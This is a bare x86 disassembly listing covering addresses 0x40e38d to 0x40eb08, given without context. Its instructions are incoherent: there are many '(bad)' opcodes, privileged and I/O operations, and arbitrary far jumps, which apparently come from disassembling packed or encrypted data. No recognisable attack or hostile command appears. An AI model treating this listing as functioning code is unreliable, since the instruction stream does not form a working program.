  40e38d:	lock cmp al,0x5
  40e390:	test   BYTE PTR [esi+0x5a],ah
  40e393:	enter  0x2d31,0xd2
  40e397:	fsub   QWORD PTR [ebp-0xf587bfa]
  40e39d:	push   eax
  40e39e:	push   edi
  40e39f:	and    edx,0x6c4466f0
  40e3a5:	mov    edi,0x423d9933
  40e3aa:	push   0xb852db0d
  40e3af:	sub    eax,0x8b84485f
  40e3b4:	mov    BYTE PTR [eax-0x53],bl
  40e3b7:	sar    DWORD PTR [edi-0x10],0xfc
  40e3bb:	xor    eax,0x78e016e3
  40e3c0:	call   0x87fe:0xd19446d7
  40e3c7:	mov    ds:0xda4dbb52,eax
  40e3cc:	outs   dx,DWORD PTR ds:[esi]
  40e3cd:	jmp    0x368f:0x6407292f
  40e3d4:	or     BYTE PTR [eax+eiz*1+0x2e24f8a3],cl
  40e3db:	add    BYTE PTR [eax-0x7a],bl
  40e3de:	dec    eax
  40e3df:	je     0x40e3e9
  40e3e1:	mov    dh,0x5d
  40e3e3:	push   esp
  40e3e4:	mov    ah,al
  40e3e6:	dec    ecx
  40e3e7:	inc    edi
  40e3e8:	daa    
  40e3e9:	or     DWORD PTR [ebx+ecx*2-0x14010ff2],ebp
  40e3f0:	sub    eax,0xea0d6f15
  40e3f5:	sbb    ah,BYTE PTR [edx]
  40e3f7:	ret    0x8b1b
  40e3fa:	dec    ecx
  40e3fb:	aad    0xa7
  40e3fd:	jns    0x40e3ff
  40e3ff:	or     esi,DWORD PTR [edi-0x1e]
  40e402:	lods   al,BYTE PTR es:[esi]
  40e404:	push   cs
  40e405:	adc    ah,BYTE PTR [esi+0x27]
  40e408:	pop    ss
  40e409:	jge    0x40e3e5
  40e40b:	ins    DWORD PTR es:[edi],dx
  40e40c:	(bad)  
  40e40d:	icebp  
  40e40e:	mov    ah,0xf1
  40e410:	repz inc edi
  40e412:	test   eax,0x52d35b53
  40e417:	and    BYTE PTR [edx+ecx*1+0x54133186],bh
  40e41e:	inc    edi
  40e41f:	mov    ebp,0x2bc67a89
  40e424:	jae    0x40e3c1
  40e426:	stos   BYTE PTR es:[edi],al
  40e427:	aam    0xa5
  40e429:	xchg   esp,eax
  40e42a:	call   0x6719c620
  40e42f:	adc    BYTE PTR [di-0x47],bl
  40e433:	fcmovnb st,st(1)
  40e435:	je     0x40e3be
  40e437:	mov    ebp,DWORD PTR [ecx]
  40e439:	not    DWORD PTR [eax-0x24]
  40e43c:	push   0xffffff81
  40e43e:	imul   ecx,DWORD PTR [eax-0x343ed4b7],0x33544d67
  40e448:	je     0x40e4c8
  40e44a:	jb     0x40e3ec
  40e44c:	xlat   BYTE PTR ds:[ebx]
  40e44d:	inc    ecx
  40e44e:	inc    ecx
  40e44f:	daa    
  40e450:	call   0x2e57b538
  40e455:	lock cmp ah,BYTE PTR [eax-0x13]
  40e459:	retf   
  40e45a:	(bad)  
  40e45b:	loop   0x40e441
  40e45d:	rcr    BYTE PTR [ebx],cl
  40e45f:	cmp    edx,DWORD PTR [ebx]
  40e461:	loopne 0x40e4d6
  40e463:	sbb    BYTE PTR ds:0xfd9bbd71,dl
  40e469:	ja     0x40e4d6
  40e46b:	jle    0x40e428
  40e46d:	ret    
  40e46e:	sub    BYTE PTR [eax],0x43
  40e471:	dec    edx
  40e472:	pop    ebx
  40e473:	clc    
  40e474:	div    ebp
  40e476:	cli    
  40e477:	dec    ebx
  40e478:	test   eax,0x89779ab5
  40e47d:	mov    WORD PTR [eax],cs
  40e47f:	mov    cl,0x8
  40e481:	inc    ecx
  40e482:	popf   
  40e483:	ret    
  40e484:	fst    st(6)
  40e486:	(bad)  
  40e487:	dec    DWORD PTR [eax]
  40e489:	mov    es,WORD PTR [ecx-0x17]
  40e48c:	daa    
  40e48d:	int3   
  40e48e:	into   
  40e48f:	jns    0x40e412
  40e491:	out    dx,eax
  40e492:	cld    
  40e493:	pop    es
  40e494:	adc    eax,0xcdcdac20
  40e499:	adc    DWORD PTR [eax],ecx
  40e49b:	push   ds
  40e49c:	jb     0x40e509
  40e49e:	xchg   edi,eax
  40e49f:	(bad)  
  40e4a0:	cmp    al,0x41
  40e4a2:	xchg   bl,al
  40e4a4:	pop    ebx
  40e4a5:	in     eax,dx
  40e4a6:	jl     0x40e4ad
  40e4a8:	jmp    0x40e47b
  40e4aa:	int3   
  40e4ab:	sub    DWORD PTR [edi-0x64],edi
  40e4ae:	xor    bl,BYTE PTR [ecx-0x39b0b3f8]
  40e4b4:	xchg   DWORD PTR [ebx-0x19],ebp
  40e4b7:	xchg   ecx,ebx
  40e4b9:	xchg   ah,dl
  40e4bb:	xchg   ecx,eax
  40e4bc:	push   es
  40e4bd:	je     0x40e537
  40e4bf:	jbe    0x40e51c
  40e4c1:	ror    DWORD PTR [ebp+0x45],1
  40e4c4:	div    BYTE PTR [edx-0x47]
  40e4c7:	adc    al,0x8c
  40e4c9:	pop    ss
  40e4ca:	hlt    
  40e4cb:	or     edi,edx
  40e4cd:	inc    esi
  40e4ce:	cdq    
  40e4cf:	fst    QWORD PTR [eax-0x2d]
  40e4d2:	mov    al,ds:0x68f06de9
  40e4d7:	int    0xb7
  40e4d9:	scas   al,BYTE PTR es:[edi]
  40e4da:	push   ss
  40e4db:	cmp    DWORD PTR [edx+0x5579f496],ebx
  40e4e1:	adc    BYTE PTR [esi-0x19b68f05],al
  40e4e7:	cmp    al,0xe7
  40e4e9:	(bad)  
  40e4ea:	sbb    ebp,DWORD PTR [ecx]
  40e4ec:	xchg   ebx,eax
  40e4ed:	xchg   esp,eax
  40e4ee:	mov    cl,0xd1
  40e4f0:	or     eax,DWORD PTR [edx+0x3cec5ce8]
  40e4f6:	test   eax,0x94f7a4bf
  40e4fb:	test   al,0xf
  40e4fd:	jmp    0x74f73c28
  40e502:	xchg   DWORD PTR [ecx],edx
  40e504:	dec    edx
  40e505:	push   ebp
  40e506:	dec    ecx
  40e508:	int3   
  40e509:	push   0xffffff86
  40e50b:	inc    ebp
  40e50c:	jg     0x40e4e2
  40e50e:	cmp    eax,0x868e1fd8
  40e513:	cs lahf 
  40e515:	rep stos BYTE PTR es:[edi],al
  40e517:	xchg   esp,eax
  40e518:	scas   al,BYTE PTR es:[edi]
  40e519:	pop    ebp
  40e51a:	addr16 xchg edx,eax
  40e51c:	std    
  40e51d:	outs   dx,DWORD PTR ds:[esi]
  40e51e:	pop    edi
  40e51f:	sahf   
  40e520:	dec    edi
  40e521:	inc    edx
  40e522:	or     DWORD PTR [ebx+0x4d0f911a],0x7a452de7
  40e52c:	aad    0x97
  40e52e:	adc    BYTE PTR [ebx],ch
  40e530:	test   BYTE PTR [ebx],cl
  40e532:	bound  ebp,QWORD PTR [ebx+edx*1]
  40e535:	sub    bh,dh
  40e537:	push   esi
  40e538:	inc    ecx
  40e539:	jmp    FWORD PTR [ebp+0x7cf09a28]
  40e53f:	sbb    ah,BYTE PTR [edi+0x54630267]
  40e545:	mov    esi,0x431220fd
  40e54a:	xchg   DWORD PTR [edi+0x1a],ebp
  40e54d:	sahf   
  40e54e:	aaa    
  40e54f:	fwait
  40e550:	(bad)  
  40e551:	cmp    BYTE PTR [edi+0x28],ch
  40e554:	retf   0x291b
  40e557:	mov    al,0x9
  40e559:	ret    0xb5ce
  40e55c:	sbb    al,0xf8
  40e55e:	retf   0x1c9f
  40e561:	neg    edx
  40e563:	in     eax,dx
  40e564:	test   BYTE PTR [eax-0x2b],bl
  40e567:	pop    es
  40e568:	daa    
  40e569:	stos   DWORD PTR es:[edi],eax
  40e56a:	shr    DWORD PTR [ebx+eax*1-0x1e],1
  40e56e:	ret    0xdaee
  40e571:	xor    al,BYTE PTR [edi]
  40e573:	loop   0x40e5bf
  40e575:	add    DWORD PTR [edi+0x3af04915],0x74c011a6
  40e57f:	pop    esi
  40e580:	jnp    0x40e590
  40e582:	pop    edi
  40e583:	mul    DWORD PTR [ebx-0x5fdc7860]
  40e589:	dec    ecx
  40e58a:	test   eax,0xb4f1bd39
  40e58f:	leave  
  40e590:	push   eax
  40e591:	popa   
  40e592:	mov    gs,WORD PTR [ebp-0x2c948cfe]
  40e598:	inc    edx
  40e599:	loopne 0x40e52c
  40e59b:	or     eax,0x28d1ea71
  40e5a0:	inc    ebp
  40e5a1:	mov    es,WORD PTR [esi+0x49]
  40e5a4:	or     DWORD PTR [ebx],esp
  40e5a6:	clc    
  40e5a7:	cli    
  40e5a8:	iret   
  40e5a9:	mov    al,al
  40e5ab:	enter  0xe31,0x3f
  40e5af:	cmp    eax,0x98ae7189
  40e5b4:	data16 cmp BYTE PTR [edi-0x34],bh
  40e5b8:	pop    ebp
  40e5b9:	push   ebp
  40e5ba:	cmp    ebp,DWORD PTR [eax]
  40e5bc:	mov    WORD PTR ds:0xd012081b,cx
  40e5c3:	pop    ecx
  40e5c4:	adc    DWORD PTR [ebx-0x5c],ecx
  40e5c7:	push   es
  40e5c8:	push   ebx
  40e5c9:	icebp  
  40e5ca:	repnz sti 
  40e5cc:	out    0xf7,eax
  40e5ce:	into   
  40e5cf:	sbb    al,0x31
  40e5d1:	push   eax
  40e5d2:	pop    ebp
  40e5d3:	outs   dx,DWORD PTR ds:[esi]
  40e5d4:	repz add al,BYTE PTR [edi+0x5e2c8d93]
  40e5db:	and    eax,0x2978f45d
  40e5e0:	sbb    DWORD PTR [eax-0x72],0x57de08f8
  40e5e7:	dec    ebx
  40e5e8:	loopne 0x40e5a8
  40e5ea:	loopne 0x40e5ee
  40e5ec:	repz call DWORD PTR [edx+eiz*1]
  40e5f0:	mov    esp,0xb77c65fb
  40e5f5:	fnstcw WORD PTR [ecx+0x5d87f728]
  40e5fb:	push   ebx
  40e5fc:	sti    
  40e5fd:	outs   dx,DWORD PTR ds:[esi]
  40e5fe:	call   0x3f409977
  40e603:	jo     0x40e5a2
  40e605:	adc    bh,BYTE PTR [ebx+0x4fac883e]
  40e60b:	adc    al,0x2e
  40e60d:	and    al,0xb6
  40e60f:	les    esp,FWORD PTR [edx]
  40e611:	mov    ch,0x87
  40e613:	iret   
  40e614:	pop    ebp
  40e615:	jp     0x40e5bb
  40e617:	fdiv   QWORD PTR [edi-0x5ad7f9f8]
  40e61d:	inc    ecx
  40e61e:	push   ebp
  40e61f:	mov    eax,ds:0x79422408
  40e624:	sub    al,0x3f
  40e626:	inc    DWORD PTR [ebx-0x32]
  40e629:	icebp  
  40e62a:	or     dl,BYTE PTR [ebx-0x6b]
  40e62d:	sub    al,0x67
  40e62f:	sbb    ah,BYTE PTR [esi]
  40e631:	xor    bh,BYTE PTR [eax]
  40e633:	aas    
  40e634:	ins    DWORD PTR es:[edi],dx
  40e635:	lds    ebx,FWORD PTR [edi+0x7af3fef7]
  40e63b:	icebp  
  40e63c:	sub    esp,ebx
  40e63e:	mov    ds:0x3b6823f9,al
  40e643:	adc    DWORD PTR [ecx],ecx
  40e645:	cwde   
  40e646:	add    ebx,ebx
  40e648:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e649:	call   0xf976fc33
  40e64e:	shl    BYTE PTR [ecx-0x6c],cl
  40e651:	jge    0x40e5fc
  40e653:	jmp    0xec0b:0x2930274a
  40e65a:	xor    BYTE PTR [edx+edi*2-0x1fe76218],al
  40e661:	(bad)  
  40e662:	out    dx,eax
  40e663:	mov    cl,0x3
  40e665:	jecxz  0x40e695
  40e667:	sub    DWORD PTR [esp+edi*8-0x14],eax
  40e66b:	xchg   ecx,eax
  40e66c:	imul   DWORD PTR [ebp+0x54]
  40e66f:	ja     0x40e657
  40e671:	xchg   edx,eax
  40e672:	xor    ah,ah
  40e674:	xor    al,dh
  40e676:	cli    
  40e677:	jge    0x40e6bd
  40e679:	ins    DWORD PTR es:[edi],dx
  40e67a:	shld   eax,edi,0xd1
  40e67e:	enter  0x19c4,0xf6
  40e682:	xchg   BYTE PTR [ecx],dh
  40e684:	mov    cl,0xb8
  40e686:	jmp    0x2c29:0x31a643ac
  40e68d:	jno    0x40e661
  40e68f:	pop    ecx
  40e690:	or     BYTE PTR [edx+0x69],bh
  40e693:	lock data16 or al,0x76
  40e697:	js     0x40e682
  40e699:	in     eax,dx
  40e69a:	jmp    0xc1e8:0xdbe22d
  40e6a1:	add    DWORD PTR [esi+0x408c08ff],0x384a2d7e
  40e6ab:	jo     0x40e648
  40e6ad:	lods   al,BYTE PTR ds:[esi]
  40e6ae:	jp     0x40e65a
  40e6b0:	jmp    0x1695:0x22c8fafe
  40e6b7:	mov    al,ds:0x578dc1b7
  40e6bc:	sbb    esp,ebp
  40e6be:	pop    esp
  40e6bf:	fs iret 
  40e6c1:	icebp  
  40e6c2:	fcom   QWORD PTR [ebx+ebp*1+0x1]
  40e6c6:	dec    esp
  40e6c7:	inc    ecx
  40e6c8:	aas    
  40e6c9:	int3   
  40e6ca:	jl     0x40e6f9
  40e6cc:	jns    0x40e704
  40e6ce:	bound  esp,QWORD PTR [eax-0x3eb9b730]
  40e6d4:	mov    DWORD PTR [esi],ebx
  40e6d6:	xchg   DWORD PTR [ebx],esp
  40e6d8:	xlat   BYTE PTR ds:[ebx]
  40e6d9:	mov    edx,ebp
  40e6db:	(bad)  
  40e6dc:	cmp    BYTE PTR gs:[edx],0x5b
  40e6e0:	xchg   ebp,eax
  40e6e1:	xor    DWORD PTR [edi-0x242b1cf9],eax
  40e6e7:	mov    edx,0x85630431
  40e6ec:	mov    ebp,ebp
  40e6ee:	and    edx,DWORD PTR [ebx+0x858843a]
  40e6f4:	or     edi,0x7107fb46
  40e6fa:	mov    bl,0xe8
  40e6fc:	cmp    dl,ah
  40e6fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6ff:	loope  0x40e70a
  40e701:	call   0xb6cdb74
  40e706:	sbb    BYTE PTR [ebp-0x8],cl
  40e709:	lock (bad) 
  40e70b:	xchg   esi,eax
  40e70c:	mov    ?,WORD PTR [esi-0x7903340c]
  40e712:	ins    DWORD PTR es:[edi],dx
  40e713:	dec    ecx
  40e714:	dec    eax
  40e715:	mov    ds:0xdd61d586,al
  40e71a:	mov    DWORD PTR [ebp-0x7d],eax
  40e71d:	adc    eax,0x169726d6
  40e722:	ror    DWORD PTR [edi],0xd8
  40e725:	scas   eax,DWORD PTR es:[edi]
  40e726:	pop    ecx
  40e727:	scas   eax,DWORD PTR es:[edi]
  40e728:	xlat   BYTE PTR ds:[ebx]
  40e729:	ins    BYTE PTR es:[edi],dx
  40e72a:	pop    ss
  40e72b:	push   0x679b1501
  40e730:	popf   
  40e731:	cwde   
  40e732:	(bad)  
  40e733:	push   0x6374f05c
  40e738:	daa    
  40e739:	cld    
  40e73a:	test   DWORD PTR [esi+0x1d],esi
  40e73d:	lahf   
  40e73e:	pop    ebx
  40e73f:	call   0xf2b3:0x83870ea1
  40e746:	bound  edi,QWORD PTR [edx+0x3d]
  40e749:	xchg   edx,eax
  40e74a:	and    DWORD PTR [eax],ebp
  40e74c:	jecxz  0x40e7af
  40e74e:	xchg   ecx,eax
  40e74f:	inc    eax
  40e750:	add    cl,BYTE PTR [esi+0x7fed9f92]
  40e756:	xchg   edx,eax
  40e757:	xor    BYTE PTR [edi+edx*2-0x74bad379],ah
  40e75e:	mov    eax,0xf0c0fe28
  40e763:	adc    dh,bh
  40e765:	push   ebp
  40e766:	push   cs
  40e767:	dec    ecx
  40e768:	fcom   QWORD PTR cs:[eax]
  40e76b:	ins    BYTE PTR es:[edi],dx
  40e76c:	in     al,0xf
  40e76e:	dec    esp
  40e76f:	pop    ebp
  40e770:	xlat   BYTE PTR ds:[ebx]
  40e771:	pop    ss
  40e772:	adc    ebp,DWORD PTR [ecx]
  40e774:	push   ebx
  40e775:	popa   
  40e776:	fst    DWORD PTR [edx+0x1d]
  40e779:	pop    esp
  40e77a:	push   cs
  40e77b:	and    al,0x47
  40e77d:	icebp  
  40e77e:	mov    edx,0x616d3e18
  40e783:	int3   
  40e784:	sbb    esi,DWORD PTR [eax]
  40e786:	mov    ah,0x56
  40e788:	mov    dh,bh
  40e78a:	xchg   DWORD PTR [ebp+0x91db69c],ebx
  40e790:	clc    
  40e791:	push   ebx
  40e792:	xchg   BYTE PTR [ebx+0x7aa1754f],ah
  40e798:	sub    edi,DWORD PTR [edi-0x5c]
  40e79b:	sub    BYTE PTR [edi+eax*2+0x7c0898f5],dh
  40e7a2:	es retf 
  40e7a4:	jno    0x40e781
  40e7a6:	out    dx,al
  40e7a7:	adc    BYTE PTR [eax+0x35c4a0ff],bl
  40e7ad:	mov    esi,0xf0f29067
  40e7b2:	and    BYTE PTR [ebp+0x7e],dl
  40e7b5:	and    al,0x43
  40e7b7:	repz or BYTE PTR [esi+ecx*4],ch
  40e7bb:	call   0x2d94dab9
  40e7c0:	(bad)
  40e7c3:	jmp    0x40e7d7
  40e7c5:	pop    edi
  40e7c6:	mov    edx,0x4e2f004b
  40e7cb:	test   eax,0x31860801
  40e7d0:	bound  ebp,QWORD PTR [esi-0xe]
  40e7d3:	jg     0x40e81a
  40e7d5:	je     0x40e7eb
  40e7d7:	sub    BYTE PTR [edx],cl
  40e7d9:	xchg   edx,eax
  40e7da:	cmp    eax,0xe72c08ef
  40e7df:	rcl    BYTE PTR [ecx+edi*1],0x62
  40e7e3:	xor    DWORD PTR [ecx+esi*8-0x1239a5b2],eax
  40e7ea:	ror    bl,0xba
  40e7ed:	cwde   
  40e7ee:	std    
  40e7ef:	ins    BYTE PTR es:[edi],dx
  40e7f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7f1:	jns    0x40e77a
  40e7f3:	mov    bh,0x7a
  40e7f5:	or     BYTE PTR [edx],ah
  40e7f7:	into   
  40e7f8:	dec    edi
  40e7f9:	xchg   BYTE PTR [eax+0x7bed4229],cl
  40e7ff:	mov    eax,ds:0x9f0aa6b8
  40e804:	push   ebx
  40e805:	fisub  WORD PTR [ebx+0x5bb03b2f]
  40e80b:	mov    edx,0xa44591fb
  40e810:	jns    0x40e84b
  40e812:	sbb    BYTE PTR [ecx],ch
  40e814:	lods   al,BYTE PTR ds:[esi]
  40e815:	out    0x5d,al
  40e817:	test   BYTE PTR [eax+0x2a],bh
  40e81a:	mov    ds,edi
  40e81c:	or     esp,DWORD PTR [ecx-0x44]
  40e81f:	sub    ecx,edi
  40e821:	sub    eax,0x6b218205
  40e826:	dec    ebp
  40e827:	aaa    
  40e828:	mov    BYTE PTR [edx-0x7d],al
  40e82b:	mov    DWORD PTR [ebx+0x4d436527],edi
  40e831:	and    al,BYTE PTR [edx-0x1e88e3e9]
  40e837:	sbb    DWORD PTR [ebx],0xffffffa9
  40e83a:	mov    ah,0x29
  40e83c:	call   0xc8b3a126
  40e841:	add    esi,DWORD PTR [ecx-0x20]
  40e844:	pop    ecx
  40e845:	mov    bl,BYTE PTR [ecx-0x6e41f8fd]
  40e84b:	call   0x9dc5dadb
  40e850:	jnp    0x40e853
  40e852:	pop    esp
  40e853:	pop    ss
  40e854:	jle    0x40e866
  40e856:	sbb    ecx,esp
  40e858:	fsubr  QWORD PTR [edi]
  40e85a:	xchg   ebp,eax
  40e85b:	out    dx,eax
  40e85c:	pop    ecx
  40e85d:	test   al,0x87
  40e85f:	retf   
  40e860:	cmp    DWORD PTR [eax-0x61e477ea],eax
  40e866:	mov    ds:0x34d1f228,al
  40e86b:	inc    esi
  40e86c:	imul   DWORD PTR [edi+0x1ecb5e6b]
  40e872:	into   
  40e873:	shl    DWORD PTR [ebp*1+0x27c15fb1],1
  40e87a:	dec    eax
  40e87b:	sub    ah,bl
  40e87d:	mov    ?,WORD PTR [esi]
  40e87f:	rcr    ah,cl
  40e881:	imul   ebx,DWORD PTR [ecx],0xffffff9b
  40e884:	or     eax,0xb7d691e
  40e889:	test   eax,0x580b6f07
  40e88e:	add    dl,bh
  40e890:	sbb    esi,ecx
  40e892:	outs   dx,BYTE PTR ds:[esi]
  40e893:	push   0xffffffd4
  40e895:	scas   al,BYTE PTR es:[edi]
  40e896:	daa    
  40e897:	jae    0x40e8b9
  40e899:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e89a:	inc    eax
  40e89b:	push   esi
  40e89c:	cmc    
  40e89d:	mov    ds:0xf1f3e8e7,eax
  40e8a2:	test   cl,0xa9
  40e8a5:	out    0xf7,eax
  40e8a7:	popf   
  40e8a8:	mov    ds:0xe93ef0c8,eax
  40e8ad:	jno    0x40e927
  40e8af:	mov    esp,0x796cde10
  40e8b4:	nop
  40e8b5:	xchg   esp,eax
  40e8b6:	dec    edx
  40e8b7:	sti    
  40e8b8:	pop    ebp
  40e8b9:	std    
  40e8ba:	or     ah,BYTE PTR [ecx]
  40e8bc:	mov    BYTE PTR [ebp+0x49],dl
  40e8bf:	push   es
  40e8c0:	push   ss
  40e8c1:	call   DWORD PTR [esi-0x25]
  40e8c4:	popf   
  40e8c5:	imul   ebx,DWORD PTR [edi],0x61
  40e8c8:	sbb    dl,BYTE PTR [ecx-0x1f]
  40e8cb:	(bad)  
  40e8cc:	pop    ds
  40e8cd:	mov    dl,0x2f
  40e8cf:	test   al,0x59
  40e8d1:	icebp  
  40e8d2:	stc    
  40e8d3:	imul   edx,DWORD PTR [ebx],0xa6463616
  40e8d9:	rcr    DWORD PTR [eax],0xd5
  40e8dc:	ret    
  40e8dd:	pop    ebp
  40e8de:	xchg   ebp,eax
  40e8df:	icebp  
  40e8e0:	jno    0x40e862
  40e8e2:	inc    edi
  40e8e3:	mov    DWORD PTR [edi-0x53],edi
  40e8e6:	dec    edi
  40e8e7:	das    
  40e8e8:	mov    esi,0x48e2bf0
  40e8ed:	repnz mov ds:0xfabfe53d,al
  40e8f3:	mov    cl,0xa0
  40e8f5:	inc    ecx
  40e8f6:	mov    DWORD PTR [edx],edi
  40e8f8:	or     edx,esi
  40e8fa:	jp     0x40e8b7
  40e8fc:	mov    dl,0xee
  40e8fe:	mov    WORD PTR [eax],?
  40e900:	in     eax,dx
  40e901:	lock mov dl,0x20
  40e904:	and    edx,DWORD PTR [esi]
  40e906:	xor    eax,ecx
  40e908:	adc    eax,0xecfaa30b
  40e90d:	sub    DWORD PTR [ecx-0x7ac20ba5],edi
  40e913:	rol    DWORD PTR [eax-0x4213fbcd],cl
  40e919:	dec    edi
  40e91a:	fldcw  WORD PTR [ecx]
  40e91c:	add    al,0x71
  40e91e:	cmp    ebx,DWORD PTR [ebx]
  40e920:	or     BYTE PTR [eax-0x7fa31b49],dl
  40e926:	or     BYTE PTR ds:[ebp-0x3f21114],0xb6
  40e92e:	or     ch,BYTE PTR [ebx-0x5b]
  40e931:	push   ebx
  40e932:	(bad)  
  40e933:	mov    ecx,DWORD PTR ds:0x6b626688
  40e939:	mov    eax,ds:0x1648e337
  40e93e:	retf   0xed27
  40e941:	add    ebx,edi
  40e943:	ret    0xba81
  40e946:	mov    BYTE PTR [eax],ch
  40e948:	pop    es
  40e949:	(bad)
  40e94d:	neg    al
  40e94f:	pop    edi
  40e950:	scas   al,BYTE PTR es:[di]
  40e952:	push   edi
  40e953:	loop   0x40e995
  40e955:	out    0xd4,al
  40e957:	test   al,0xa6
  40e959:	(bad)  
  40e95a:	stos   BYTE PTR es:[edi],al
  40e95b:	icebp  
  40e95c:	into   
  40e95d:	aaa    
  40e95e:	jb     0x40e99d
  40e960:	dec    eax
  40e961:	ds and cl,ch
  40e964:	push   ss
  40e965:	pushf  
  40e966:	push   ss
  40e967:	inc    esi
  40e968:	lea    ebp,[eax+eiz*2]
  40e96b:	and    BYTE PTR [ebx+0x2aa8bba8],al
  40e971:	icebp  
  40e972:	mov    eax,0x4fdff7a7
  40e977:	lock and DWORD PTR [ebx-0x690b4191],ebx
  40e97e:	xchg   BYTE PTR [ebp-0x80],bl
  40e981:	outs   dx,BYTE PTR ds:[esi]
  40e982:	mov    esp,0xdf231d8f
  40e987:	sub    esp,DWORD PTR [edi-0x63]
  40e98a:	imul   esi,edx,0xe2dd23d9
  40e990:	push   ebp
  40e991:	retf   0xa955
  40e994:	(bad)  
  40e995:	adc    al,BYTE PTR [ebx+0x6131a205]
  40e99b:	test   BYTE PTR [esi-0xd],dl
  40e99e:	pop    eax
  40e99f:	mov    edx,0xfda5575c
  40e9a4:	fbld   TBYTE PTR [eax-0x5d]
  40e9a7:	imul   esi,DWORD PTR [ecx-0x32],0x1504c27c
  40e9ae:	or     ebp,DWORD PTR [ecx]
  40e9b0:	cld    
  40e9b1:	or     DWORD PTR [ebx+0x67],0x2bc4ad39
  40e9b8:	iret   
  40e9b9:	mov    ch,0xa6
  40e9bb:	pusha  
  40e9bc:	jecxz  0x40ea26
  40e9be:	lods   eax,DWORD PTR ds:[esi]
  40e9bf:	mov    ecx,0x3b87bd3b
  40e9c4:	rcr    ebp,cl
  40e9c6:	call   0x2a56:0xff27e5cf
  40e9cd:	imul   eax,DWORD PTR [esi+0x146f43a2],0xffffffbd
  40e9d4:	or     BYTE PTR [esi-0x33a90090],dh
  40e9da:	scas   eax,DWORD PTR es:[di]
  40e9dc:	xor    edx,esi
  40e9de:	and    ch,BYTE PTR [esi]
  40e9e0:	ficom  DWORD PTR [eax-0x23]
  40e9e3:	inc    esp
  40e9e4:	pop    ebp
  40e9e5:	pusha  
  40e9e6:	jnp    0x40ea3a
  40e9e8:	test   DWORD PTR [edi-0x40],0xbf74ca6a
  40e9ef:	(bad)  [eax-0x4695510f]
  40e9f5:	xchg   ecx,eax
  40e9f6:	rcr    BYTE PTR [esi+0x47],cl
  40e9f9:	dec    esp
  40e9fa:	lahf   
  40e9fb:	(bad)  
  40e9fc:	adc    eax,0x15838661
  40ea01:	arpl   WORD PTR [edx-0x34f60b88],si
  40ea07:	sar    BYTE PTR [ecx],0x93
  40ea0a:	(bad)  [ecx]
  40ea0c:	ins    BYTE PTR es:[edi],dx
  40ea0d:	or     dh,dh
  40ea0f:	fisttp DWORD PTR [eax]
  40ea11:	xor    al,0xf1
  40ea13:	mov    DWORD PTR [ecx],esi
  40ea15:	sahf   
  40ea16:	push   ebp
  40ea17:	dec    ecx
  40ea18:	and    eax,0x81e83191
  40ea1d:	add    al,0x54
  40ea1f:	sub    ah,ch
  40ea21:	lods   al,BYTE PTR ds:[esi]
  40ea22:	(bad)  
  40ea23:	sub    cl,BYTE PTR [eax]
  40ea25:	in     al,0x6f
  40ea27:	enter  0x6b29,0x39
  40ea2b:	popf   
  40ea2c:	call   0xe0279322
  40ea31:	or     ch,0x3e
  40ea34:	push   ecx
  40ea35:	mov    edi,0x52db5b9f
  40ea3a:	xchg   edi,eax
  40ea3c:	jle    0x40e9c2
  40ea3e:	sbb    cl,cl
  40ea40:	sub    eax,0x91501fd0
  40ea45:	cli    
  40ea46:	sub    DWORD PTR [si+0x60],esi
  40ea4a:	add    BYTE PTR [edi],bl
  40ea4c:	not    ecx
  40ea4e:	cmp    BYTE PTR [ecx+0x60],ch
  40ea51:	add    ch,BYTE PTR [ebx]
  40ea53:	test   BYTE PTR [eax],ah
  40ea55:	add    eax,esp
  40ea57:	idiv   DWORD PTR [ebx-0x64d71051]
  40ea5d:	in     eax,0x82
  40ea5f:	pusha  
  40ea60:	or     BYTE PTR [eax-0x71e9aa95],cl
  40ea66:	xchg   ebx,eax
  40ea67:	cld    
  40ea68:	adc    edi,ecx
  40ea6a:	mov    al,ds:0xf57003c4
  40ea6f:	and    edi,eax
  40ea71:	retf   
  40ea72:	add    DWORD PTR [ebp+0xd5b7601],0xffffffba
  40ea79:	je     0x40ea6b
  40ea7b:	jae    0x40eab4
  40ea7d:	bound  eax,QWORD PTR [edi-0x1a3b84c2]
  40ea83:	daa    
  40ea84:	pop    ebx
  40ea85:	push   ss
  40ea86:	or     eax,DWORD PTR [ecx-0x32]
  40ea89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea8a:	leave  
  40ea8b:	jbe    0x40ea7a
  40ea8d:	aaa    
  40ea8e:	xchg   esi,eax
  40ea8f:	les    ecx,FWORD PTR [ecx+0x40ad94e5]
  40ea95:	aas    
  40ea96:	xchg   ebp,eax
  40ea97:	xor    al,0x88
  40ea99:	jg     0x40ea82
  40ea9b:	bound  ecx,QWORD PTR [ecx-0xd]
  40ea9e:	mov    al,ds:0x1b040b65
  40eaa3:	or     eax,0x98073160
  40eaa8:	push   es
  40eaa9:	pop    esp
  40eaaa:	sahf   
  40eaab:	stc    
  40eaac:	daa    
  40eaad:	or     eax,0xbccdc528
  40eab2:	pop    es
  40eab3:	repz add edx,ebx
  40eab6:	outs   dx,DWORD PTR ds:[esi]
  40eab7:	sub    DWORD PTR [ebx+0x853c4f8],edx
  40eabd:	add    al,0x25
  40eabf:	stos   BYTE PTR es:[edi],al
  40eac0:	fstp   TBYTE PTR cs:[esi+0x12e34abf]
  40eac7:	fs pop ds
  40eac9:	push   eax
  40eaca:	popf   
  40eacb:	lods   eax,DWORD PTR ds:[esi]
  40eacc:	repnz mov edi,0xe2738a86
  40ead2:	or     esi,edx
  40ead4:	test   eax,0x1c1661d7
  40ead9:	lea    eax,[edi+0x268e79cb]
  40eadf:	mov    ebx,0x80652408
  40eae4:	ror    ah,cl
  40eae6:	stos   BYTE PTR es:[edi],al
  40eae7:	test   DWORD PTR [edx+0xe],esi
  40eaea:	xor    al,0x8b
  40eaec:	stos   BYTE PTR es:[edi],al
  40eaed:	iret   
  40eaee:	adc    ch,BYTE PTR [esi]
  40eaf0:	out    dx,eax
  40eaf1:	xor    BYTE PTR [edi+0x4a],0x73
  40eaf5:	div    BYTE PTR [eax]
  40eaf7:	cmp    bl,BYTE PTR [edi-0x58c03312]
  40eafd:	adc    ecx,esi
  40eaff:	jne    0x40eb0b
  40eb01:	mov    al,ds:0x6cd6c455
  40eb06:	pop    ebp
  40eb07:	(bad)  
  40eb08:	fisub  WORD PTR [ecx-0x1]
